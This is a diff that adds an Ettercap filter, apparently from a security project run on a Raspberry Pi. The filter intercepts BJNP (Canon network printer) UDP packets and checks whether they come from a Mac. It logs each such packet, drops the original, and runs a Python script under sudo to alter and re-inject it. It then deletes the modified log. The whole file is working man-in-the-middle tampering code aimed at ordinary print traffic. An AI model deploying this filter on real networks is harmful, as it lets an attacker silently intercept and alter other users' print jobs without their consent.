@@ -1,0 +1,22 @@
+if (ip.proto == UDP) {
+	if (search(DECODED.data, "BJNP")) {
+		msg("BJNP (udp) packet found!");
+		# Look's for "Macbook" in header
+		if (search(DATA.data, "\x4d\x00\x61\x00\x63")) {
+			msg("User is printing from a Mac!\n");
+
+			log(DATA.data, "/tmp/BJNP_Mac_packet_DATA.log");
+
+			drop();
+			msg("Original BJNP packet dropped!");
+
+			execinject("sudo /usr/bin/python /home/pi/CYBER_PROJ/packet_modify.py /tmp/BJNP_Mac_packet_DATA.log");
+
+			log(DATA.data, "/tmp/BJNP_Mac_packet_DATA_mod.log");
+
+			msg("Modified BJNP has been injected and sent!");
+
+			exec("sudo /bin/rm /tmp/BJNP_Mac_packet_DATA_mod.log");
+		}
+	}
+}
